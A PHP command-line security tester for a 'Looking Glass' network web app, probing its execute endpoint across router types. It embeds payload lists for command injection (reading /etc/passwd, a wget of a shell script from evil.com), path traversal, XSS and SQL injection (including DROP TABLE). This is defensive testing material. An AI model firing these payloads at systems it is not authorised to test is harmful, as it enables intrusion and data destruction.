<?php
/**
 * Looking Glass Security Testing Suite - Windows Compatible Version
 * Fixed for PHP on Windows - no ANSI colors in CLI mode
 * 
 * Usage: php looking_glass_security_tester_windows.php --url=http://localhost/looking-glass
 */

class LookingGlassSecurityTester {
    
    private $base_url;
    private $results = array();
    private $verbose = true;
    private $test_csrf = true;
    private $router_types = array();
    private $use_colors = false; // Disabled for Windows
    private $router_id = null;
    private $datacenter_id = null;
    private $csrf_token_cache = null;
    
    // Test payloads for different vulnerability types
    private $payloads = array(
        'command_injection' => array(
            '; cat /etc/passwd',
            '| ls -la /',
            '`whoami`',
            '$(cat /etc/passwd)',
            '&& id',
            '; wget http://evil.com/shell.sh',
            '\n/bin/cat /etc/passwd',
            '%0a/bin/ls',
            '||/bin/ls',
            '; echo vulnerable > /tmp/test.txt',
            '`touch /tmp/vulnerable`',
            '$(touch /tmp/vulnerable2)',
            '; sleep 10',
            '| sleep 10',
        ),
        
        'path_traversal' => array(
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '..;/..;/..;/etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
        ),
        
        'xss' => array(
            '<script>alert("XSS")</script>',
            '"><script>alert(1)</script>',
            '\';alert(1);//',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '${alert(1)}',
            '<iframe src="javascript:alert(1)">',
        ),
        
        'sql_injection' => array(
            "' OR '1'='1",
            "1' OR '1' = '1",
            "' OR '1'='1' --",
            "1; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "admin' --",
            "' OR 1=1--",
        ),
        
        'buffer_overflow' => array(
            'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', // 300 A's
            'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB', // 100 B's
            '%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s',
            '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x',
        ),
        
        'special_characters' => array(
            '!@#$%^&*()_+-=[]{}|;:\'",.<>?/',
            'test$variable',
            'test${variable}',
            'test`command`',
            'test$(command)',
            "test\x00null",
            "test\nnewline",
            "test\rturn",
            "test\ttab",
        ),
        
        'legitimate_inputs' => array(
            '8.8.8.8',
            '2001:4860:4860::8888',
            'google.com',
            'AS13335',
            '192.168.1.0/24',
            '2001:db8::/32',
        )
    );
    
    // Router-specific test cases
    private $router_tests = array(
        'cisco' => array(
            'commands' => array('ping', 'traceroute', 'bgp', 'as-path-regex', 'as'),
            'special' => array(
                'ping vrf management 8.8.8.8',
                'show ip bgp 1.1.1.1',
                'traceroute source Loopback0 8.8.8.8'
            )
        ),
        'juniper' => array(
            'commands' => array('ping', 'traceroute', 'bgp', 'as-path-regex', 'as'),
            'special' => array(
                'ping routing-instance inet.0 8.8.8.8',
                'show route protocol bgp 1.1.1.1/32',
                'traceroute interface lo0 8.8.8.8'
            )
        ),
        'bird' => array(
            'commands' => array('ping', 'traceroute', 'bgp', 'as-path-regex', 'as'),
            'special' => array(
                'show route for 8.8.8.8',
                'show route protocol bgp',
                'show protocols all'
            )
        ),
        'quagga' => array(
            'commands' => array('ping', 'traceroute', 'bgp', 'as-path-regex', 'as'),
            'special' => array(
                'show ip bgp summary',
                'show ip route 8.8.8.8',
                'show bgp ipv6 summary'
            )
        ),
        'mikrotik' => array(
            'commands' => array('ping', 'traceroute', 'bgp', 'as-path-regex', 'as'),
            'special' => array(
                '/ping count=10 8.8.8.8',
                '/tool traceroute 8.8.8.8',
                '/routing bgp peer print'
            )
        ),
        'vyatta' => array(
            'commands' => array('ping', 'traceroute', 'bgp', 'as-path-regex', 'as'),
            'special' => array(
                'ping count 10 8.8.8.8',
                'show ip bgp summary',
                'traceroute 8.8.8.8'
            )
        ),
        'tnsr' => array(
            'commands' => array('ping', 'traceroute', 'bgp', 'as-path-regex', 'as', 'mtr'),
            'special' => array(
                'ping 8.8.8.8 count 5',
                'traceroute 8.8.8.8 max-hops 30',
                'show route table ipv4-VRF:0'
            )
        ),
        'justlinux' => array(
            'commands' => array('ping', 'traceroute', 'mtr'),
            'special' => array(
                'ping -c 10 8.8.8.8',
                'traceroute -m 30 8.8.8.8',
                'mtr -c 10 8.8.8.8'
            )
        ),
        'arista' => array(
            'commands' => array('ping', 'traceroute', 'bgp', 'as-path-regex', 'as'),
            'special' => array(
                'ping 8.8.8.8',
                'show ip bgp',
                'traceroute 8.8.8.8'
            )
        ),
        'huawei' => array(
            'commands' => array('ping', 'traceroute', 'bgp', 'as-path-regex', 'as'),
            'special' => array(
                'ping -a 192.168.1.1 8.8.8.8',
                'display ip routing-table',
                'traceroute 8.8.8.8'
            )
        )
    );
    
    public function __construct($base_url, $router_types = null, $router_id = null, $datacenter_id = null) {
        $this->base_url = rtrim($base_url, '/');
        $this->router_id = $router_id;
        $this->datacenter_id = $datacenter_id;
        
        if ($router_types === null) {
            $this->router_types = array_keys($this->router_tests);
        } else {
            $this->router_types = is_array($router_types) ? $router_types : array($router_types);
        }
        
        // Detect if running on Windows
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $this->use_colors = false;
        }
    }
    
    public function runTests() {
        $this->printHeader();
        
        if ($this->test_csrf) {
            $this->testCSRFProtection();
        }
        
        foreach ($this->router_types as $router_type) {
            $this->testRouter($router_type);
        }
        
        $this->printSummary();
    }
    
    private function testCSRFProtection() {
        $this->printSection("CSRF Protection Test");
        
        if (empty($this->router_id)) {
            $this->printResult('WARN', 'router-id not set; CSRF tests may be inaccurate');
            echo "\n";
            return;
        }

        $this->println("Testing request without CSRF token... ", false);
        $response = $this->makeRequest($this->buildRequestParams('ping', '8.8.8.8', false));
        
        if ($this->containsError($response, array('csrf', 'token', 'security'))) {
            $this->printResult('PASS', 'CSRF protection active');
            $this->results['csrf']['without_token'] = 'PASS';
        } else {
            $this->printResult('FAIL', 'No CSRF protection detected');
            $this->results['csrf']['without_token'] = 'FAIL';
        }
        
        $this->println("Testing request with invalid CSRF token... ", false);
        $response = $this->makeRequest($this->buildRequestParams('ping', '8.8.8.8', 'invalid_token_12345'));
        
        if ($this->containsError($response, array('csrf', 'token', 'invalid', 'security'))) {
            $this->printResult('PASS', 'Invalid token rejected');
            $this->results['csrf']['invalid_token'] = 'PASS';
        } else {
            $this->printResult('WARN', 'Invalid token may be accepted');
            $this->results['csrf']['invalid_token'] = 'WARN';
        }
        
        $this->println("Attempting to retrieve valid CSRF token... ", false);
        $csrf_token = $this->getCSRFToken();
        if ($csrf_token) {
            $this->printResult('INFO', "Token retrieved: " . substr($csrf_token, 0, 20) . "...");
            
            $response = $this->makeRequest($this->buildRequestParams('ping', '8.8.8.8', $csrf_token));
            
            if (!$this->containsError($response, array('csrf', 'token'))) {
                $this->printResult('PASS', 'Valid token accepted');
                $this->results['csrf']['valid_token'] = 'PASS';
            }
        } else {
            $this->printResult('INFO', 'Could not retrieve token from index page');
        }
        
        echo "\n";
    }
    
    private function testRouter($router_type) {
        $this->printSection("Testing Router: " . strtoupper($router_type));
        
        if (!isset($this->router_tests[$router_type])) {
            $this->println("Unknown router type: $router_type", true);
            return;
        }
        
        $router_config = $this->router_tests[$router_type];
        
        foreach ($router_config['commands'] as $command) {
            $this->testCommand($router_type, $command);
        }
        
        echo "\n";
    }
    
    private function testCommand($router_type, $command) {
        $this->println("\nTesting command: $command\n", true);
        
        $this->testVulnerability($router_type, $command, 'command_injection');
        
        if (in_array($command, array('ping', 'traceroute'))) {
            $this->testVulnerability($router_type, $command, 'path_traversal');
        }
        
        $this->testVulnerability($router_type, $command, 'xss');
        $this->testVulnerability($router_type, $command, 'buffer_overflow');
        $this->testLegitimateInputs($router_type, $command);
    }
    
    private function testVulnerability($router_type, $command, $vuln_type) {
        $payloads = isset($this->payloads[$vuln_type]) ? $this->payloads[$vuln_type] : array();
        $blocked = 0;
        $vulnerable = 0;
        $errors = array();
        $sample_vulnerable_payload = null;
        $sample_vulnerable_response = null;
        
        foreach ($payloads as $payload) {
            $base_input = $this->getBaseInputForCommand($command);
            $test_param = ($vuln_type === 'legitimate_inputs')
                ? $payload
                : $base_input . $payload;
            
            if ($vuln_type === 'buffer_overflow') {
                $test_param = $payload;
            }
            
            $start_time = microtime(true);
            $response = $this->makeRequest(
                $this->buildRequestParams($command, $test_param, $this->getCachedCSRFToken())
            );
            $exec_time = microtime(true) - $start_time;
            
            if ($this->isVulnerable($response, $vuln_type, $exec_time)) {
                $vulnerable++;
                $errors[] = substr($payload, 0, 30) . "...";
                if ($sample_vulnerable_payload === null) {
                    $sample_vulnerable_payload = $payload;
                    $sample_vulnerable_response = $this->extractErrorMessage($response);
                }
            } elseif ($this->isBlocked($response)) {
                $blocked++;
            }
        }
        
        $total = count($payloads);
        $status = ($vulnerable > 0) ? 'FAIL' : (($blocked === $total) ? 'PASS' : 'WARN');
        
        $this->println("  $vuln_type: ", false);
        $this->println("[$status]", false);
        $this->println(" Blocked: $blocked/$total", false);
        
        if ($vulnerable > 0) {
            $this->println(" VULNERABLE: $vulnerable", false);
            if ($this->verbose && count($errors) > 0) {
                $this->println("\n    Vulnerable payloads: " . implode(', ', array_slice($errors, 0, 3)), false);
            }
        }
        $this->println("\n", false);

        if ($this->verbose && $vulnerable > 0 && $sample_vulnerable_response !== null) {
            $this->println("    Sample payload: " . $sample_vulnerable_payload, true);
            $this->println("    Sample response: " . $sample_vulnerable_response, true);
        }
        
        $this->results[$router_type][$command][$vuln_type] = array(
            'status' => $status,
            'blocked' => $blocked,
            'total' => $total,
            'vulnerable' => $vulnerable,
            'sample_payload' => $sample_vulnerable_payload,
            'sample_response' => $sample_vulnerable_response
        );
    }
    
    private function testLegitimateInputs($router_type, $command) {
        $working = 0;
        $total = 0;
        $sample_error = null;
        $sample_input = null;

        $inputs = $this->getLegitimateInputsForCommand($command);
        foreach ($inputs as $input) {
            $total++;
            $response = $this->makeRequest(
                $this->buildRequestParams($command, $input, $this->getCachedCSRFToken())
            );

            $decoded = json_decode($response, true);
            if (is_array($decoded)) {
                if (isset($decoded['result'])) {
                    if ($this->isExpectedResult($command, $decoded['result'])) {
                        $working++;
                        continue;
                    }
                    if ($sample_error === null) {
                        $sample_error = $this->extractErrorMessage($decoded['result']);
                        $sample_input = $input;
                    }
                    continue;
                }
                if (isset($decoded['error'])) {
                    if ($sample_error === null) {
                        $sample_error = $decoded['error'];
                        $sample_input = $input;
                    }
                    continue;
                }
            }

            if (!$this->containsError($response, array('error', 'invalid', 'failed'))) {
                $working++;
            } elseif ($sample_error === null) {
                $sample_error = $this->extractErrorMessage($response);
                $sample_input = $input;
            }
        }
        
        $status = ($working === $total) ? 'PASS' : (($working > 0) ? 'WARN' : 'FAIL');
        
        $this->println("  legitimate_inputs: ", false);
        $this->println("[$status]", false);
        $this->println(" Working: $working/$total\n", false);
        
        $this->results[$router_type][$command]['legitimate'] = array(
            'status' => $status,
            'working' => $working,
            'total' => $total,
            'sample_input' => $sample_input,
            'sample_error' => $sample_error
        );

        if ($this->verbose && $status !== 'PASS' && $sample_error !== null) {
            $this->println("    Sample input: " . $sample_input, true);
            $this->println("    Sample error: " . $sample_error, true);
        }
    }
    
    private function isVulnerable($response, $vuln_type, $exec_time = 0) {
        if ($vuln_type === 'command_injection') {
            if (preg_match('/root:|daemon:|bin:|nobody:|www-data:/', $response)) {
                return true;
            }
            if (preg_match('/dr[w-]xr-xr-x|total \d+|\.bashrc|\.profile/', $response)) {
                return true;
            }
            if (preg_match('/uid=|gid=|groups=/', $response)) {
                return true;
            }
            if ($exec_time > 8) {
                return true;
            }
            if (preg_match('/vulnerable|test\.txt/', $response)) {
                return true;
            }
        }
        
        if ($vuln_type === 'path_traversal') {
            if (preg_match('/root:|\/etc\/passwd|\/windows\/system32/', $response)) {
                return true;
            }
        }
        
        if ($vuln_type === 'xss') {
            if (preg_match('/<script|alert\(|onerror=|javascript:/', $response)) {
                return true;
            }
        }
        
        if ($vuln_type === 'sql_injection') {
            if (preg_match('/SQL syntax|mysql_fetch|Warning.*mysql|PostgreSQL.*ERROR|warning.*pg_/', $response)) {
                return true;
            }
        }
        
        return false;
    }
    
    private function isBlocked($response) {
        $block_indicators = array(
            'error', 'invalid', 'denied', 'blocked', 'forbidden',
            'not allowed', 'security', 'violation', 'illegal',
            'unauthorized', 'failed', 'rejected'
        );
        
        return $this->containsError($response, $block_indicators);
    }
    
    private function containsError($response, $indicators) {
        $response_lower = strtolower($response);
        foreach ($indicators as $indicator) {
            if (strpos($response_lower, strtolower($indicator)) !== false) {
                return true;
            }
        }
        return false;
    }
    
    private function makeRequest($params) {
        $url = $this->base_url . '/execute.php';
        
        // Create cookie file in temp directory
        $cookie_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'lg_cookies.txt';
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 45);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
        
        $response = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            return "CURL Error: " . $error;
        }
        
        return $response ? $response : '';
    }

    private function extractErrorMessage($response) {
        if (empty($response)) {
            return 'Empty response';
        }

        $decoded = json_decode($response, true);
        if (is_array($decoded) && isset($decoded['error'])) {
            return $decoded['error'];
        }

        $stripped = trim(strip_tags($response));
        if (strlen($stripped) > 200) {
            return substr($stripped, 0, 200) . '...';
        }
        return $stripped;
    }

    private function isExpectedResult($command, $result) {
        $text = strtolower($result);
        $error_markers = array(
            'unknown command',
            'cli syntax error',
            'invalid command',
            'error:'
        );
        foreach ($error_markers as $marker) {
            if (strpos($text, $marker) !== false) {
                return false;
            }
        }

        switch ($command) {
            case 'as':
            case 'as-path-regex':
                return (strpos($text, 'bgp table version') !== false ||
                        strpos($text, 'displayed ') !== false);
            case 'bgp':
                return (strpos($text, 'bgp table version') !== false ||
                        strpos($text, 'bgp routing table entry') !== false ||
                        strpos($text, 'route') !== false);
            case 'ping':
            case 'traceroute':
            case 'mtr':
                return (strpos($text, 'ping') !== false ||
                        strpos($text, 'traceroute') !== false ||
                        strpos($text, 'mtr') !== false);
            default:
                return true;
        }
    }

    private function buildRequestParams($command, $parameter, $csrf_token = null) {
        $params = array(
            'query' => $command,
            'parameter' => $parameter,
            // Honeypot must be present and empty to avoid antispam rejection
            'dontlook' => ''
        );

        if (!empty($csrf_token)) {
            $params['csrf_token'] = $csrf_token;
        }

        if (!empty($this->router_id)) {
            $params['routers'] = $this->router_id;
            if (!empty($this->datacenter_id)) {
                $params['datacenters'] = $this->datacenter_id;
            }
        } else {
            // Legacy behavior (may not work with datacenter-scoped routers)
            $params['router'] = isset($this->router_types[0]) ? $this->router_types[0] : 'cisco';
        }

        return $params;
    }

    private function getCachedCSRFToken() {
        if ($this->csrf_token_cache !== null) {
            return $this->csrf_token_cache;
        }
        $this->csrf_token_cache = $this->getCSRFToken();
        return $this->csrf_token_cache;
    }

    private function getBaseInputForCommand($command) {
        switch ($command) {
            case 'as':
                return '13335';
            case 'as-path-regex':
                return '^13335$';
            default:
                return '8.8.8.8';
        }
    }

    private function getLegitimateInputsForCommand($command) {
        switch ($command) {
            case 'ping':
            case 'traceroute':
            case 'mtr':
                return array('8.8.8.8', '2001:4860:4860::8888', 'google.com');
            case 'bgp':
                return array('8.8.8.8', '2001:4860:4860::8888');
            case 'as-path-regex':
                return array('^13335$', '^13335_.*');
            case 'as':
                return array('13335');
            default:
                return array('8.8.8.8');
        }
    }
    
    private function getCSRFToken() {
        $url = $this->base_url . '/index.php';
        $cookie_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'lg_cookies.txt';
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        if (preg_match('/name=["\']csrf_token["\'].*?value=["\']([^"\']+)["\']/', $response, $matches)) {
            return $matches[1];
        }
        
        return null;
    }
    
    private function printHeader() {
        echo "\n";
        echo "=========================================\n";
        echo "  Looking Glass Security Testing Suite\n";
        echo "=========================================\n\n";
        echo "Target: " . $this->base_url . "\n";
        echo "Routers: " . implode(', ', $this->router_types) . "\n";
        echo "Date: " . date('Y-m-d H:i:s') . "\n";
        echo "\n";
    }
    
    private function printSection($title) {
        echo "\n";
        echo "--- $title ---\n\n";
    }
    
    private function println($text, $newline = true) {
        echo $text;
        if ($newline) echo "\n";
    }
    
    private function printResult($status, $message) {
        echo "[$status] $message\n";
    }
    
    private function printSummary() {
        $this->printSection("SUMMARY");
        
        $total_pass = 0;
        $total_fail = 0;
        $total_warn = 0;
        
        foreach ($this->results as $router => $commands) {
            if ($router === 'csrf') continue;
            
            foreach ($commands as $command => $tests) {
                foreach ($tests as $test => $result) {
                    if (isset($result['status'])) {
                        switch($result['status']) {
                            case 'PASS': $total_pass++; break;
                            case 'FAIL': $total_fail++; break;
                            case 'WARN': $total_warn++; break;
                        }
                    }
                }
            }
        }
        
        echo "Total Tests Run: " . ($total_pass + $total_fail + $total_warn) . "\n";
        echo "Passed: $total_pass\n";
        echo "Failed: $total_fail\n";
        echo "Warnings: $total_warn\n";
        
        echo "\nSecurity Grade: ";
        if ($total_fail > 0) {
            echo "F - CRITICAL VULNERABILITIES FOUND\n";
            echo "Immediate action required to patch vulnerabilities.\n";
        } elseif ($total_warn > 5) {
            echo "C - Multiple warnings detected\n";
            echo "Review and improve security measures.\n";
        } elseif ($total_warn > 0) {
            echo "B - Minor issues detected\n";
            echo "Generally secure with room for improvement.\n";
        } else {
            echo "A - Excellent security\n";
            echo "All security tests passed successfully.\n";
        }
        
        if ($total_fail > 0) {
            echo "\n";
            echo "CRITICAL ISSUES FOUND:\n";
            foreach ($this->results as $router => $commands) {
                if ($router === 'csrf') continue;
                foreach ($commands as $command => $tests) {
                    foreach ($tests as $test => $result) {
                        if (isset($result['status']) && $result['status'] === 'FAIL') {
                            echo "  - $router/$command: $test vulnerability detected\n";
                        }
                    }
                }
            }
        }
        
        $this->saveReport();
    }
    
    private function saveReport() {
        $report = array(
            'timestamp' => date('Y-m-d H:i:s'),
            'target' => $this->base_url,
            'routers_tested' => $this->router_types,
            'router_id' => $this->router_id,
            'datacenter_id' => $this->datacenter_id,
            'results' => $this->results,
            'summary' => array(
                'total_tests' => count($this->results),
                'vulnerabilities_found' => $this->countVulnerabilities()
            )
        );
        
        $filename = 'lg_security_report_' . date('Ymd_His') . '.json';
        file_put_contents($filename, json_encode($report, JSON_PRETTY_PRINT));
        
        echo "\nDetailed report saved to: $filename\n";
    }
    
    private function countVulnerabilities() {
        $count = 0;
        foreach ($this->results as $router => $commands) {
            if ($router === 'csrf') continue;
            foreach ($commands as $command => $tests) {
                foreach ($tests as $test => $result) {
                    if (isset($result['vulnerable']) && $result['vulnerable'] > 0) {
                        $count += $result['vulnerable'];
                    }
                }
            }
        }
        return $count;
    }
}

// Command-line interface
if (php_sapi_name() === 'cli') {
    $options = getopt('', array('url:', 'router:', 'router-id:', 'datacenter:', 'help', 'no-csrf', 'verbose'));
    
    if (isset($options['help'])) {
        echo "Looking Glass Security Testing Suite - Windows Version\n\n";
        echo "Usage: php looking_glass_security_tester_windows.php [OPTIONS]\n\n";
        echo "Options:\n";
        echo "  --url=URL        Base URL of Looking Glass (required)\n";
        echo "  --router=TYPE    Test specific router type (optional)\n";
        echo "  --router-id=ID   Router ID to execute commands against\n";
        echo "  --datacenter=ID  Datacenter ID (required for DC-scoped routers)\n";
        echo "                   Options: cisco, juniper, bird, quagga, mikrotik,\n";
        echo "                           vyatta, tnsr, justlinux, arista, huawei\n";
        echo "  --no-csrf        Skip CSRF protection tests\n";
        echo "  --verbose        Show detailed output\n";
        echo "  --help           Show this help message\n\n";
        echo "Examples:\n";
        echo "  php looking_glass_security_tester_windows.php --url=http://localhost/looking-glass\n";
        echo "  php looking_glass_security_tester_windows.php --url=http://localhost/looking-glass --router=cisco\n";
        echo "  php looking_glass_security_tester_windows.php --url=http://localhost/looking-glass --router=tnsr --router-id=KC1-TNSR01 --datacenter=dc1\n";
        echo "  php looking_glass_security_tester_windows.php --url=http://localhost/looking-glass --no-csrf\n";
        exit(0);
    }
    
    if (!isset($options['url'])) {
        echo "Error: URL is required\n";
        echo "Use --help for usage information\n";
        exit(1);
    }
    
    $url = $options['url'];
    $router = isset($options['router']) ? $options['router'] : null;
    $router_id = isset($options['router-id']) ? $options['router-id'] : null;
    $datacenter_id = isset($options['datacenter']) ? $options['datacenter'] : null;
    
    $tester = new LookingGlassSecurityTester($url, $router, $router_id, $datacenter_id);
    
    if (isset($options['no-csrf'])) {
        $tester->test_csrf = false;
    }
    
    if (isset($options['verbose'])) {
        $tester->verbose = true;
    }
    
    $tester->runTests();
}
?>